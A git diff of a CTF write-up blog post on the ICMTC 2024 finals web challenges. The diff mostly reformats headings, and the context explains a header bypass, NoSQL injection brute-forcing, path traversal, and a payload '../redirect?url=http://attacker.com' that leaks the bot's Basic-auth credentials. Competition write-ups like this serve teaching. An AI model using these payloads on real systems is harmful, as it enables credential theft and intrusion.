@@ -3,7 +3,7 @@ title:  "ICMTC 2024 FINALS WEB CHALLENGES WRITEUP"
 description: WEB WRITEUP FOR ICMTC CTF
 image: 
   path: /assets/img/blog/icmtc.jpg
-tags: [ctf],[sql_injection],[nosql_injection][web]
+tags: ctf,sql_injection,nosql_injection,web
 date:   2024-07-28 13:49:56 +0300
 categories: CTFs
 ---
@@ -12,12 +12,12 @@ and this is my Writeup for ICMTC FINALS 2024
 
 ![ASCWG.jpg](/assets/img/blog/icmtc.jpg)
 
-# Restricted Network 
+## Restricted Network 
 In this challenge we need to bypass the php filter to trick the server and make it think we are in the same network as him.
 
 ![restricted_network.webp](/assets/img/blog/icmtc/restricted_network.webp)
 
-## Code analysis
+### Code analysis
 first the server checks if http request method is `POST` and if true then the server checks if the header `X-Forwarded-For` is set or not if not it will give you error message and if set then we will go to the next check which is an `if condition` that checks if the value of `X-Forwarded-For` have the string `certrestrictednetwork.` in the position 0 using the code `stripos($xForwardedFor, 'certrestrictednetwork.') === 0` if true then the server will set the `$domain` variable to be equal to the string after the word `certrestrictednetwork.` and then the server will check if the value of `$domain` is equal to the value of `127.0.0.1` using the function `gethostbyname()` if true then the server will give you the flag.
 PRETTY FORWARD CODE RIGHT?
 
@@ -26,7 +26,7 @@ just send a normal request with the header `X-Forwarded-For: certrestrictnetwork
 ![restrictflag.webp](/assets/img/blog/icmtc/restrict_flag.webp)
 the flag is encoded with a strange type of encoding that I don't know what it is but a identifier will know it, i used https://www.dcode.fr/cipher-identifier to identify the encoding and it was `base 91` so I decoded it and got the flag.
 
-# Internship application
+## Internship application
 
 The challenge is white box and the source code is given to us.
 ```js
@@ -147,7 +147,7 @@ app.listen(PORT, () => {
 });
 
 ```
-## Code analysis
+### Code analysis
 The server is a simple express server that serves a static file and has 8 routes:
 1. `/` which renders the index page.
 2. `/submit` which takes the email and cover letter from the body and inserts them into the database.
@@ -161,12 +161,12 @@ The server is a simple express server that serves a static file and has 8 routes
 The server uses basic authentication to protect the admin routes. The back end using library called `basic-auth` to get the username and password from the request and check if they are equal to the admin username and password. If they are equal, the server will call the next middleware, otherwise, it will return a 401 status code with the message `Authentication required.`.
 
 > In the backend there is a bot that will approve the application automatically. they informed us in the competition.
-## Vulnerability
+### Vulnerability
 1- You can see that `/redirect` route is vulnerable to open redirect attack because it takes the url from the query string and redirects to it without any validation. This can be exploited to redirect the admin to an attacker-controlled website and steal the admin's credentials.
 
 2- There is no validation on the email field so we can insert any character in the email field and it will be inserted in the database. So imagine the scinario where the email field has no validation and being inserted as it's right after the `approve` endpoint in the url so if the email is equal to `email = ../` then when the bot trying to approve the application it will actually goes to the root directory `https://domain/approve/../ == https://domain/` 
 
-## Exploitation
+### Exploitation
 1- To exploit the open redirect vulnerability, and no email validation we can set the email to `../redirect?url=http://attacker.com` and when the bot tries to approve the application, it will redirect to `http://attacker.com` and we wil receive the admin credentials.
 how the admin credentials will be sent to us? the admin credentials are sent in the request header `Authorization` this is how `basic-auth` works so we need to create a server that will receive the request and log the headers.
 
@@ -178,7 +178,7 @@ The credentials are sent to us in the `Authorization` header and was base64 enco
 now we need to set that header in our request to the `admin` endpoint and we will get the flag.
 
 
-# Reveal Me
+## Reveal Me
 
 In this challenge we need to do `NoSQL injection` to bypass the login and get the flag. it's error based injection.
 
@@ -255,7 +255,7 @@ why not brute force the password field? because the password field is hashed and
 
 why not the reset password token field? because it's being changed every time you request a reset password link.
 
-## Exploitation
+### Exploitation
 ```python
 
 import requests
@@ -303,21 +303,22 @@ print('Successfully brute forced token:', token_prefix + urllib.parse.unquote(re
 ```
 > The script will brute force the secret field and get the flag.
 
-# File Pattern Challenge
+## File Pattern Challenge
 
 This challenge is about finding the flag in a file that is being served by the server.\
 The Flag path is in html comment in the front end source code.
 
 ![file_pattern](/assets/img/blog/icmtc/File_Pattern.png)
 
-# Basic Test
+### Basic Test
 i just started by playing with the pattern field to see what will happen 
 ![file_pattern](/assets/img/blog/icmtc/file_pattern2.png)
 
 The output gives you the position of the `sequence` you entered in the `pattern` field.
 
-# Exploitation
-```import requests
+### Exploitation
+```python
+import requests
 
 url = "http://46.101.221.164:8080/"
 filename = "../../../tmp/flag_21e0e99ddec45ab7a40a675175e2704d.txt"
